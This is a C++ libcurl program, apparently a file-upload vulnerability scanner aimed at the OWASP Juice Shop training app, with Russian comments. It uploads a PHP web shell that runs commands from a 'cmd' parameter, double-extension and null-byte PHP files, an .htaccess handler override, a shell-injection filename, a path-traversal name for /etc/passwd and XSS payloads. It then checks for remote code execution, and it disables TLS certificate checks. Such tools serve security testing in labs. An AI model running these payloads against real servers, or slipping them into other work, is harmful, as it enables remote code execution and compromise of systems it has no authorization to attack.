#include <iostream>
#include <string>
#include <vector>
#include <curl/curl.h>

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t total_size = size * nmemb;
    if (output) {
        output->append(static_cast<char*>(contents), total_size);
    }
    return total_size;
}

void upload_file(const std::string& url, const std::string& token = "") {

    std::vector<std::pair<std::string, std::string>> test_cases = {
        {"legal.pdf", "%PDF-1.4\n%%EOF\n"},  // Должен быть разрешен
        {"test.exe", "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00"},  // Исполняемый файл
        {"shell.php", "<?php system($_GET['cmd']); echo 'EXEC_SUCCESS'; ?>"},
        {"profile.jpg.php", "<?php echo 'VULNERABLE!'; ?>"},
        {".htaccess", "SetHandler application/x-httpd-php"},
        {";sleep$IFS$()10", "malicious content"},
        {"../../etc/passwd", "root:x:0:0:root:/root:/bin/bash\n"},
        {"<script>alert('xss')</script>.png", "XSS payload"},
        {"test.html", "<html><body><script>alert('XSS')</script></body></html>"},
        {"large_file.bin", std::string(1024*1024*10, 'A')},  // 10MB файл
        {"null_byte.png%00.php", "<?php phpinfo(); ?>",}
    };

    std::cout << "\n= Начинаем тестирование на уязвимости загрузки файлов =\n\n";

    for (const auto& [filename, content] : test_cases) {
        CURL* curl = curl_easy_init();
        if (!curl) {
            std::cerr << "Ошибка инициализации cURL\n";
            continue;
        }

        std::string response;
        long response_code = 0;
        struct curl_slist* headers = nullptr;
        bool critical_error = false;

        std::cout << "Попытка загрузки: " << filename << "\n";

        // Настройка базовых параметров запроса
        curl_easy_setopt(curl, CURLOPT_URL, (url + "/file-upload").c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);  // Увеличенный таймаут для больших файлов
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); 



        // Добавление заголовка авторизации
        if (!token.empty()) {
            headers = curl_slist_append(headers, ("Authorization: Bearer " + token).c_str());
            headers = curl_slist_append(headers, "Content-Type: multipart/form-data");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        }

        // Настройка MIME данных для загрузки файла
        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* part = curl_mime_addpart(mime);
        
        // Для теста Content-Type можно попробовать подменить
        if (filename.find(".jpg.php") != std::string::npos) {
            curl_mime_type(part, "image/jpeg");
        }
        
        curl_mime_name(part, "file");
        curl_mime_filename(part, filename.c_str());
        curl_mime_data(part, content.c_str(), content.size());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

        // Выполнение запроса
        CURLcode res = curl_easy_perform(curl);
        
        // Получение HTTP-кода ответа
        if (res == CURLE_OK) {
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        } else {
            std::cerr << "  Ошибка cURL: " << curl_easy_strerror(res) << "\n";
            critical_error = true;
        }

        // Анализ результатов
        bool uploaded = (response_code == 201);  // Juice Shop возвращает 201 при успешной загрузке
        bool vulnerability_detected = false;
        std::string vulnerability_type;
        std::string additional_info;

        // Определение типа уязвимости по имени файла и содержимому
        if (filename.find(".php") != std::string::npos || 
            filename.find(".phtml") != std::string::npos) {
            if (uploaded) {
                vulnerability_type = "[CRITICAL] PHP upload vulnerability";
                vulnerability_detected = true;
                
                // Проверка на выполнение PHP-кода
                if (response.find("EXEC_SUCCESS") != std::string::npos) {
                    additional_info = "RCE confirmed! PHP code executed on server";
                } else {
                    additional_info = "Check RCE manually: " + url + "/uploads/" + filename + "?cmd=id";
                }
            }
        }
        
        else if (filename.find(".exe") != std::string::npos || 
                 filename.find(".dll") != std::string::npos) {
            if (uploaded) {
                vulnerability_type = "[HIGH] Executable upload vulnerability";
                vulnerability_detected = true;
            }
        }
        
        else if (filename.find(";") != std::string::npos || 
                 filename.find("$IFS") != std::string::npos) {
            if (uploaded) {
                vulnerability_type = "[CRITICAL] Command injection bypass";
                vulnerability_detected = true;
            }
        }
        
        else if (filename.find("..") != std::string::npos) {
            if (uploaded) {
                vulnerability_type = "[HIGH] Path traversal vulnerability";
                vulnerability_detected = true;
                
                // Специальная проверка для /etc/passwd
                if (filename.find("passwd") != std::string::npos && 
                    response.find("root:") != std::string::npos) {
                    additional_info = "Sensitive file accessed!";
                }
            }
        }
        
        else if (filename.find("<script>") != std::string::npos ||
                 filename.find(".html") != std::string::npos) {
            if (uploaded) {
                vulnerability_type = "[MEDIUM] XSS in filename vulnerability";
                vulnerability_detected = true;
                
                // Проверка на отраженный XSS в ответе
                if (response.find("<script>alert") != std::string::npos) {
                    additional_info = "Reflected XSS detected in server response";
                }
            }
        }
        
        else if (filename == ".htaccess") {
            if (uploaded) {
                vulnerability_type = "[HIGH] .htaccess manipulation vulnerability";
                vulnerability_detected = true;
            }
        }
        
        
        else if (filename.find("null_byte") != std::string::npos) {
            if (uploaded) {
                vulnerability_type = "[CRITICAL] Null byte injection vulnerability";
                vulnerability_detected = true;
            }
        }
        else if (filename.find("large_file") != std::string::npos) {
            if (res == CURLE_OPERATION_TIMEDOUT) {
                vulnerability_type = "[MEDIUM] Possible DoS vulnerability";
                vulnerability_detected = true;
                additional_info = "Server timed out on large file upload";
            } else if (uploaded) {
                vulnerability_type = "[INFO] Large file uploaded successfully";
                vulnerability_detected = true;
            }
        }

        //вывод результатов
        if (critical_error) {
            std::cout << "  [ERROR] Request failed\n";
        } else if (vulnerability_detected) {
            std::cout << "  Статус: " << response_code << " | " << vulnerability_type << "\n";
            if (!additional_info.empty()) {
                std::cout << "  * " << additional_info << "\n";
            }
        } else if (uploaded) {
            std::cout << "  Статус: " << response_code << " | [INFO] File uploaded\n";
        } else {
            std::cout << "  Статус: " << response_code << " | [INFO] File blocked\n";
        }

        // Дополнительные проверки для Juice Shop
        if (uploaded && !vulnerability_detected) {

            bool success_response = (response.find("\"status\":\"success\"") != std::string::npos) ||
                                   (response.find("\"uploaded\":true") != std::string::npos);
            
            if (filename == "legal.pdf") {
                if (success_response) {
                    std::cout << "  [NOTE] Legal file uploaded as expected\n";
                } else {
                    std::cout << "  [WARNING] Unexpected response for legal file\n";
                }
            } else {
                std::cout << "  [SUSPICIOUS] Unexpected successful upload\n";
            }
        }

        // Проверка на CSRF-уязвимость (если токен не был передан)
        if (token.empty() && uploaded && vulnerability_detected) {
            std::cout << "  [MEDIUM] CSRF vulnerability detected (auth not required)\n";
        }


        std::cout << std::endl;

        // Освобождение ресурсов
        curl_mime_free(mime);
        if (headers) {
            curl_slist_free_all(headers);
        }
        curl_easy_cleanup(curl);
    }
}


